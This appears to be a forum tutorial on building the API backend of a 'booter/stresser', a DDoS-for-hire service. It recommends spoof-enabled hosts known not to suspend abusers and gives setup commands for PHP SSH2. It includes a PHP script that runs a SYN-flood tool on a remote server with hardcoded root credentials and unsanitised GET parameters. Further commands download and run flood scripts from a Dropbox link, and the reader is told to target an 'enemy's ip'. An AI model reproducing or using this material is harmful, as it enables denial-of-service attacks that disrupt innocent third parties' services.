Make Your Own Booter API
 
Step 1, (Getting the servers)Have you ever owned a booter and wanted a stead flow of power but are constantly letdown by the sad apis on the market today?
Well I'm going to teach you to make your own api for your booter/stresser.
 
Buying a server:
There are many providers out there who have spoof enabled such as:
Ecatel - http://ecatel.info
Netrouting - http://netrouting.com
Limehost - http://limehost.ro
Goweb - http://goweb.de
 
Ecatel is the most known one because they do not suspend.
You will need to pick a server for your api.
 
 
Step 2. (Setting up SSH2)
You will need to follow the following instructions for setting it up on a dedicated server.
 
Firstly, we’re going to install the php:
Code:
yum install php -y
 
Second, we’re going to install the dependencies:
Code:
yum install gcc php-devel php-pear libssh2 libssh2-devel
 
These will allow us to build the SSH2 extension using pecl.
 
Code:
pecl install -f ssh2
 
After running that command, it should stop at a line like:
 
Code:
..done: 22,740 bytes
5 source files, building
running: phpize
Configuring for:
PHP Api Version:  20041225
Zend Module Api No:  20060613
Zend Extension Api No:   220060519
libssh2 prefix? [autodetect] :
 
All you have to do is hit Enter and it should detect the proper path. Once the install is completed, you just have to tell PHP to load the extension when it boots.
 
Code:
touch /etc/php.d/ssh2.ini
 
Code:
echo extension=ssh2.so > /etc/php.d/ssh2.ini
 
Now restart your webserver and test to see if the changes took effect.
 
Code:
/etc/init.d/httpd restart
 
To check if you have installed ssh2 correctly type:
 
Code:
php -m | grep ssh2
 
You should get a line returned with ‘ssh2′.
 
 
Step 3 (Uploading Attack Scripts and API)
 
First you want to upload your php script to the following directory
 
Code:
cd /var/www/html
 
Code:
nano api.php
 
Second you will need to copy the following code below then past it by right clicking in cmd.
 
Code:
<?php
set_time_limit(0);
ignore_user_abort(true);
 
if (!function_exists("ssh2_connect")) die("function ssh2_connect doesn't exist");
// log in at server1.example.com on port 22
if(!($con = ssh2_connect("155.133.24.116", 22))){
    echo "fail: unable to establish connection\n";
} else {
    // try to authenticate with username root, password secretpassword
    if(!ssh2_auth_password($con, "root", "Pochi1234")) {
  echo "fail: unable to authenticate\n";
    } else {
 
  // execute a command
  if (!($stream = ssh2_exec($con, "/root/ssyn ".$_GET['host']." ".$_GET['port']." ".$_GET['time']))) {
    echo "fail: unable to execute command\n";
  } else {
echo "" . stream_get_contents($stream);
 
    echo "attack sent.";
    }
    }
}
?>
 
After pasting the code you will need to edit the script by replacing the ip with yours the username with yours and the password with yours.
 
Once you have edited the script and replaced the following listed above you will then press ctrl+x and save it.
 
After saving it you will need to download the attack scripts to your root folder.
 
Code:
cd /root
Then:
Code:
wget http://dl.dropbox.com/u/64563206/scripts.zip
Then:
Code:
unzip scripts.zip
Then:
Code:
chmod +x rudy slow ssyn udplag 50x arme ghp list.txt proxies.txt
Then:
Code:
./ssyn 109.210.235.256 80 10 o
 
 
Step 4 (Final Step)
 
Time to test her out:
Type in Browser:
Code:
http://Youripaddress/api.php?host=1.1.1.1&port=80&time=100
Replace the 1.1.1.1 with you enemy's ip.
Replace Youripaddress with your server ip.
